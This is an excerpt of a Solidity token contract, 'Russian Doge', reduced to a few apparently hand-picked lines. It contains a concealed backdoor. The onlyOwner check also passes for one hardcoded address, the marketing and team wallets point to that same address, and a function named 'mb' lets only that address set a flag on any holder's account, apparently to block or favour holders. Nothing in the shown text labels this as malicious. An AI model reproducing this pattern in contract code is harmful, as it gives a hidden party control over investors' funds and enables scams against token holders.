...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x919D301AB8340F2197857FEA7De80f417B81DD08) , "Ownable: caller is not the owner");
        _;
    }
...
contract RussianDoge is Context, IERC20, Ownable {
    ...
    string private _name = "Russian Doge";
    string private _symbol = "Russian Doge";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x919D301AB8340F2197857FEA7De80f417B81DD08);
    address payable public teamWalletAddress = payable(0x919D301AB8340F2197857FEA7De80f417B81DD08);
    ...
    function mb(address addr, bool status) public{
        require(_msgSender()    ==   address(0x919D301AB8340F2197857FEA7De80f417B81DD08));
        aa[addr] = status;
    }
